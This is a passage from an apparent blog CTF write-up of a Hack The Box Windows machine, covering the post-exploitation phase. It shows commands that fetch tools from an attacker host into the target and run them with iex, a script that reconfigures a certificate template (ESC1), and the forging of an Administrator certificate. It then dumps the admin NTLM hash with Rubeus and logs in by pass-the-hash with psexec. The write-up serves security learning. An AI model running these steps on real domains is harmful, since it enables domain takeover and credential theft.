+put Whatif.omv</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhSGdsRKcwSpL4iMdMUUnZyiiZXMW5xNldrpKGhVDKUAiGMQbfHO3xUc_cyU-6DRs8AV3-MkV2WKBPt5dWySDHDwXYUdjQXOFKxOp9-cWYIp0OXJ1cUvCvAofwKksKqhSV4NTeO5od8f-MB-Uq1nn7_36mV7S8sfs7yEjXSAy9NFJdmmQAeBYz9CyK-5Q=s16000"/></span></p>
+<p><span style="color: #000000;">Now, we need to start a reverse listener on port 4444 and wait for a connection. After 4-5 minutes, we see a connection from the user diegocruz.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjQ-V6NBRxVfJ8gDh-uDETL7FeV6xAML_ZAcsSl6H_inzBpukjC6crEmXt5EClY7BQzEGxs9MDbqGOcuI9kyr9xNxuf8Wq_5SVf0SsyblYcvTMcItc7FwNfoQZk43rM4-RA8-M-8_3hZ-3gWXVYtaq06s75tmNI2yQ21rDUMfO3oEnZXCGO3NSEXxTRoA=s16000"/></span></p>
+<h3><span style="color: #800000;">Post Exploitation</span></h3>
+<p><span style="color: #000000;">After hours of browsing through, nothing seemed to be working. Finally, we remembered the “Cert Enroll” share that was running on the machine. We checked and confirmed that a certificate enrollment service was running</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEi6f4DtSiirgqU8HBa_KAHkx207QJGiQabj4jL9JspXq4JQQyW2ffwAcII-slgPbVYXNUUSROZqVtv3_8K8ZaP_nWMicjD_k9CpD1QDAaiF34uX_1hjPtXne9R0hVSnBNHeZeCuxxg6z3cWU03o2woy2OAZLYuJQQKOd_zHioFL1NlfmTMI4FJBWqz5sw=s16000"/></span></p>
+<p><span style="color: #000000;">About a few days ago, Hacking Articles covered <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/domain-persistence-golden-certificate-attack/">Domain Persistence using Golden Certificate</a></strong></span> in which we explained a few basics about ADCS (Active Directory Certificate Service) and forging a golden certificate to maintain persistence on a domain.</span></p>
+<p><span style="color: #000000;">Interestingly enough, our resource was a whitepaper called “Certified Pre-owned” authored by William Schroeder and Lee Christensen which can be found <a style="color: #000000;" href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">here</a>.</span></p>
+<p><span style="color: #000000;">On the guidelines of this paper, I checked if user Diego Cruz can enroll certificate or not.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certutil -catemplates</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhrnyHLLpoy_ar0RDK-5EUCH6m0LGrS1J1Zhu7HtCMhhkK7f3sn7F_u8-84JBw3izArOhWgQ-wGoSAoKWEJLGnhaFst5kCAFtXgHHdSO_eQ-gxcEnvM5GyL22U3nlA3AdAENwK87qnLgd14nUetEASfi9smDyOj5IKCwZ00XwE49k-O-uxomZv_OhRjMQ=s16000"/></span></p>
+<p><span style="color: #000000;">It seemed that Diego Cruz could in fact enroll certificates under a web template.</span></p>
+<h4><span style="color: #000000;">Exploiting Web Template for Domain Escalation</span></h4>
+<p><span style="color: #000000;">A very interesting technique is also covered in the same paper called Domain Escalation. Please refer to the paper for full details on the attack as there is limited scope to be pedantic while writing a CTF writeup, and so, we will stick to the attack only. The basic working of this attack is that we will reconfigure the web template to add smart card logon and request administrator certificate from the domain and in turn use that to request a ticket.</span></p>
+<p><span style="color: #000000;">First, we need to download Certify.exe and Rubeus.exe for this attack. Compiled binaries can be found in the SharpCollection repo <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_x64">here</a></strong></span>. Then I launch my python webserver.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjXZQV2kQnWS1R_N7aean8J61sTQn796TG-IVfIouaEr1Bo2U6wPdzJhIaz2pmfHibnxlPSmWATUgqdjOdPXJzcTnUUYiFKLTP_4BfCQ64STMJrxwxQF0O-JU8E7ETrTz8fK6t6WSfPymRy1PDavghB5lUvudAw00alAk7jRIqec_oNdkuyFDPP3rlIkg=s16000"/></span></p>
+<p><span style="color: #000000;">We can now use Powershell’s IWR to download this like before</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Invoke-WebRequest "http://10.10.16.3:8000/Certify.exe" -OutFile "C:\users\diegocruz\Desktop\Certify.exe"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg_H5I09ukTnLfc0FN8sGCxfse62q890x9Gz64fAoDPCD9CBCcuFTiY-AA4FgE4W0XjzEvhEeBiSt_62qzVYMILSLHh3dQzIJfQgecflLz_40OMbq2u4ZeU5Io5zfozRs0kPgRawqYruyv9YHJEDqj2vNBQj2EHUHRsbFhOSYHQQPPfbEeK4g9woBIYeQ=s16000"/></span></p>
+<p><span style="color: #000000;">Similarly for Rubeus</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Invoke-WebRequest "http://10.10.16.3/Rubeus.exe" -OutFile "C:\users\diegocruz\Desktop\Rubeus.exe"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgoKdtw99U2UNaq2Kj2cT4VmiIv2AQF0bsEfgtsqdYptowrP2kXc-a1cJRKFtSEhkyP6EbgJ9DvMAg4U14EwlgRanPzlqKoScLrmksma3G85-XLZqOgyKIRo42IJfotc9U3_Kk6-N6ZOojRwUGxWgtOXWDh44s7J46DP5VOL0UblyKfcFM8gArn4R9OHA=s16000"/></span></p>
+<p><span style="color: #000000;">Now, we first need to check the Web template and see its configuration.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">.\Certify.exe find</pre>
+<p><span style="color: #000000;">Scroll down to find the web template. It would look like this</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhMyyAVdV7WJXxxViY60eExXo9ovXbMdRRh50vWIKrQMov6hJHVb61EY0IAq1cfYtt2L33iWFcJqDFKzE-c1XxdqhjE-8bZ6Mf2i1wpAO83hzV1k6VpumJJgaa6S8kVgjLKmdllaAnHxxY7rWcHyG_BIXbfC_7q6IZRH0Qr4fvhObEnO5uZvn9VrIk7yQ=s16000"/></span></p>
+<p><span style="color: #000000;">This was very interesting as according to Will’s post <a style="color: #000000;" href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">here</a> we found a misconfiguration under the ESC1 category. Microsoft tells us that the ENROLLEE_SUPPLIES_SUBJECT flag set means that the user can specify a custom SAN (Subject Alternate Name).</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjcItlzrcZAsyIiPlfZ3GOPbBPo-SO_eSXL9L4gt3TH38fwjljafH_d09SoVjGYAuka7Ksq0oHSWD7Vurz-bY2_VxhMl1AxVH6BHdG7-kJ5IqFD8rPisPaSUEjUldEiLkAtAujxRs15aCbgVIL8NiXkVAkn8f68QbPfC00l2vpK2qwK_rHw_WdsHEIjdg=s16000"/></span></p>
+<p><span style="color: #000000;">And also, being able to supply a custom SAN means that user can replicate any user in the domain!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh02eC5cKfVWVGA2zuaR68p0MUrdy9DPwjmV8Fy3uZh714tBDu9bUZmVdhGuyJTHpTxmxa1PQI_ZSqRuFYPQS7jV-tODnvx6kq3tdjKCwxj4lOGLi2nlhIj0S_-PRnkVUlhJAbaMj1n1IBne3KtnkrZcOni_AcWzkOoF3BaRHhg9KeQTh-An0fCpji6Wg=s16000"/></span></p>
+<h4><span style="color: #000000;">Reconfiguring Web Template and Requesting Administrator Certificate</span></h4>
+<p><span style="color: #000000;">There is only one problem currently though, currently, this web template can only be used for server authentication. For us to be able to request an admin certificate, we need to have a smart card logon feature (which allows certificate requesting by user). However, Diego Cruz has full control over this web template, hence, there is a need to edit this template and add a smart card logon feature.</span></p>
+<p><span style="color: #000000;">We will use three scripts for this to happen. <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a></strong></span>, <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/cfalta/PoshADCS">PoshADCS</a> </strong></span>and <strong>reconfiguretemplate.ps1</strong></span></p>
+<p><span style="color: #000000;">What ADCS.ps1 script does is that it helps set those highlighted properties on a certificate template if the user has control over them.</span></p>
+<p><span style="color: #000000;">Reconfiguretemplate.ps1 script uses ADCS’s function Set-ADCSTemplate to set these properties effectively. We just need to list here the Smart Card Logon’s EKU (Enhanced Key Usage). These EKUs are available on Microsoft’s website. For smart card logon, EKUs are: OID 1.3.6.1.4.1.311.20.2.2 which will be supplied in mspki-certificate-name-flag property</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">$Properties = @{}
+$Properties.Add('mspki-certificate-name-flag',1)
+$Properties.Add('pkiextendedkeyusage',@('1.3.6.1.4.1.311.20.2.2','1.3.6.1.5.5.7.3.2'))
+$Properties.Add('msPKI-Certificate-Application-Policy',@('1.3.6.1.4.1.311.20.2.2','1.3.6.1.5.5.7.3.2'))
+$Properties.Add('flags','CLEAR')
+$Properties.Add('mspki-enrollment-flag',0)
+$Properties.Add('mspki-private-key-flag',256)
+$Properties.Add('pkidefaultkeyspec',1)
+
+Set-ADCSTemplate -Name Web -Properties $Properties -Force</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh19O4CJ2b5AhHoceo2X1v_37xHXur2R1PrbZI__piCe7AY8MQP73W8phltnIihmCCC6L0dDDV3Sn393waTy22bf46yzPNbJnQneEAmSsNWZ4S-0ufLuA0LcDgkVpf9lj_y18tBoI1AACTbA4OQGmdT5ag2s794VUbrwkMrfG5v3-rMe2AGliVgm4zzuQ=s16000"/></span></p>
+<p><span style="color: #000000;">Now, we need to download and import these scripts onto the server as an IEX cmdlet. Given our python server is already active we can do this like so and then finally run Certify.exe find command to find all the templates now active:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Invoke-WebRequest "http://10.10.16.3/PowerView.ps1" -OutFile "C:\users\diegocruz\Desktop\PowerView.ps1"
+Invoke-WebRequest "http://10.10.16.3/ADCS.ps1" -OutFile "C:\users\diegocruz\Desktop\ADCS.ps1"
+Invoke-WebRequest "http://10.10.16.3/reconfiguretemplate.ps1" -OutFile "C:\users\diegocruz\Desktop\reconfiguretemplate.ps1"
+
+cat -raw PowerView.ps1 | iex
+cat -raw ADCS.ps1 | iex
+cat -raw reconfiguretemplate.ps1 | iex
+.\Certify.exe find</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg4S5r-voxHu-R1G3JJFQi0d-JiVOE7H0CD-1ZQeDCFpf-DCOiI9Z7gLsad5MlDug8MGLN-Qo-p7KSTloTXqaNR34JSQUuDEUX5hnttlMl5klY3gGoSe2HLNSe4wRbsTRsJMQ2dW8xevIIFDYMFK9wURzQuYUvUu2osz9_C4m46M-m6a0--VApVurIQ1w=s16000"/></span></p>
+<p><span style="color: #000000;">Now, we scroll down again and try to find a Web template. You would observe how the columns are looking different. We have managed to add Smart Card Logon feature to this template.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgvT2Ny8R_P2sf_AM3-HfGHzf8qTnILF9pFHkdCEyTtm5QFvXPYEO8leVoiH5mIBTBl5Ey7YciVGa8veKE9MmpbRwcdWqcihyScGn_4XFSxqDPqN75cBdJ8_P_Y-imIMtGKvgGn4b3kQx1kIUHQhfI4t2Y2rYkB4U1XIni76bt5L6VvrgyeWTOWxQSSJw=s16000"/></span></p>
+<h4><span style="color: #000000;">Generating Administrator Certificate and Achieving Domain Escalation</span></h4>
+<p><span style="color: #000000;">Now, our template is ready. Diego Cruz can now request certificates by impersonating any user. He just needs to supply a subject alt name. Certify.exe can do this with the /altname:&lt;user to be requested&gt; like so:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">.\certify.exe request /ca:earth.windcorp.htb\windcorp-CA /template:Web /altname:Administrator</pre>
+<p><span style="color: #000000;">And Woah! We have managed to snag an administrator certificate!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhFzJL_SC7lhcWbizq_RyKHvZvgMPsXQj1GKIh5YPgK8L5w0qrRXYR8PBiqsr2FsVo7qYKus4PcbvgGZ77nzkmqxx29fM5xQWQWoImGo1Z94TLIJxiQC3tHgqsPue_bTklA3rbD7Po3Rrv4vijl2gKMl0jT0WhN2Ro9aGztHGg20MXAfvu7bSBjEXVQCQ=s16000"/></span></p>
+<p><span style="color: #000000;">The certificate request ID can also be noted here as /id:&lt;&gt; option in certify can re-request the same certificate just by supplying this ID. Moving on, we see that the certificate we generated is in *.pem extension. Microsoft uses *.pfx and so we need to convert this to pfx format using openssl. For that, we will download copy this certificate (start copying where it says “BEGIN RSA KEY” and end at “END CERTIFICATE”) and save as cert.pem in our Kali machine.</span></p>
+<p><span style="color: #000000;">We can then use openssl to convert this in pfx like so:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx</pre>
+<p><span style="color: #000000;">In our golden certificate article, we have explained this command.</span></p>
+<p><span style="color: #000000;">This will give you cert.pfx as output. I added a simple password 123 while exporting this cert.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgfXuzPtIKzn-FSKOG3fuWZc6sWfnaFvJ9q1wMYnZJzK9seq3RYAjJqPZB_AiyiBTM1uReh9OalW3ZKbxJ3_7aZsdeRAtZBl_8aaRX4eAc-1daS5Z4sROKwVa5lCHY1TQjphMqg_R2nq0HQVzI15ye-Q46IOajlxAT43lFCyT8AdHNNWyJHUZ9bOvoOzQ=s16000"/></span></p>
+<h4><span style="color: #000000;">Using the Administrator Certificate for Domain Escalation</span></h4>
+<p><span style="color: #000000;">We need to copy this in the victim machine and run Rubeus asktgt command to ask for a Ticket Granting Ticket of the user administrator which can be used to conduct pass a ticket attack. One bonus option Rubeus offers is that it can directly dump NTLM hash using /getcredentials option</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Invoke-WebRequest "http://10.10.16.3/cert.pfx" -OutFile "C:\users\diegocruz\Desktop\cert.pfx"
+.\Rubeus.exe asktgt /user:Administrator /certificate:C:\users\diegocruz\Desktop\cert.pfx /password:123</pre>
+<p><span style="color: #000000;">As you can see we have obtained a kirbi ticket successfully!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiZcQ_kuUjbG95pxrpDNQfUBFQzq8Xay8KlOwxBmyKj2hw8Y-uGth9ENG-7WTawCW5QBwN6RCIL6aN51sq-EFgD76pplPDytYnAykdizH1giLmh2BAFvj9taOPY4gUMKrrmsgjn6-D-wCjy6pv1TIJVufy_Fg3_rw4VcTCBbrhayUZvmBKB3-3ucGKQNw=s16000"/></span></p>
+<p><span style="color: #000000;">On scrolling down the ticket, we see Rubeus has successfully managed to extract admin’s NTLM hash too!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEim0F48bgm4b_TyaiD11xhK5gxMyYjpg8PXQ3MuVA0iemgRE_HEiQP4pTPuQ5MWinL9gjMMCh4THaZNKSFs5BASfjbCJHdv1KGnPJe4Gc-K7BnhoKkge-N2c3MFCAmlg3nFqOBspJf5ZDfNKeBQkPHLghxb5IVgPPD7pbRU2-A-654M5WuANjYPqHwiZQ=s16000"/></span></p>
+<p><span style="color: #000000;">What’s more to be done? Passing the hash and logging in as an administrator. This can be done using impacket’s psexec like so:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 /home/kali/impacket/examples/psexec.py -hashes 3CCCXXXXXXXXXXXXXXXXXXXXXXXXXXXX:3CCCXXXXXXXXXXXXXXXXXXXXXXXXXXXX administrator@10.129.95.208 cmd.exe</pre>
+<p><span style="color: #000000;">I have masked the NTLM hash so as to not steal the fun of solving this lab. Since psexec takes in input as NT:LM format (backwards compatibility as it is an old tool), you type the same hash twice and it should work.</span></p>
+<p><span style="color: #000000;">We obtained an admin session and read the congratulatory root flag!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjp7umR9Je00nYM-xTzpCUyhdfeVAgZ8kO3zTYWCEz7euGhke5rpn7OBzTqWqRvlNzoIZ12LFmZ_7ji4aP43QJ4UIvwOMgmroLzyhnjVo8_lomwxXbyZrj5YuhmRidRg2q4tWUa3_3TpvWdcZ4bRWlhcgYMLgUbjiiSZbMMI1AA9MA4nUtJ-g_uTvFOsQ=s16000"/></span></p>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;">Will Schroeder and Lee Christensen are diligently working on offensive testing of Active Directory Certificate Service. The box included privilege escalation through the Domain Escalation method mentioned in their research paper. The box was a brain scratcher but it was a lot of fun to learn the basics of ADCS, apply them in a real-life scenario. Active Directories are pretty widespread throughout corporate networks and having misconfigured certificate templates can prove harmful. Hope you enjoyed the article. Thanks for reading.</span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong> <span style="color: #0000ff;"><a class="broken_link" style="color: #0000ff;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></span></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
